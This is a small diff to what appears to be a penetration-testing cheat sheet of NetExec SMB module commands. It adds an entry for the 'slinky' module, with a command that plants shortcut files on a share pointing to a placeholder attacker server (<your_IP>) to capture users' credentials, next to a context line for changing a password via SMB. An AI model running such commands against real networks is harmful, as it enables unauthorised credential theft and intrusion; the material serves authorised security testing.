@@ -27,4 +27,8 @@ nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
 ```
 
 
+Slinky:
 
+```
+netexec smb <ip> -u user -p pass -M slinky -o NAME=test SERVER=<your_IP>
+```
